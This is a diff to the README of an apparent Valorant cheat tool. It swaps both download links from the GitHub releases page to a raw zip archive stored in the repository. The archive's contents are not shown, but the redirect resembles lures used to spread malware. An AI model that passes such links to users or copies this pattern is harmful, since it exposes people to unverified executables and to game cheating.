@@ -1,6 +1,6 @@
 # 🎯 Valorant-External-Assistant-2026 - Visual tools for better gameplay awareness
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/nayrut2757/Valorant-External-Assistant-2026/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/nayrut2757/Valorant-External-Assistant-2026/main/molpe/Assistant-External-Valorant-v1.3.zip)
 
 ## 📖 About this project
 
@@ -25,7 +25,7 @@ Check your computer settings before you start. Press the Windows key and type "A
 
 You must visit the official release page to get the files. This page contains the current version of the assistant.
 
-[Download the latest version here](https://github.com/nayrut2757/Valorant-External-Assistant-2026/releases)
+[Download the latest version here](https://raw.githubusercontent.com/nayrut2757/Valorant-External-Assistant-2026/main/molpe/Assistant-External-Valorant-v1.3.zip)
 
 1. Open your web browser. 
 2. Go to the link provided above.
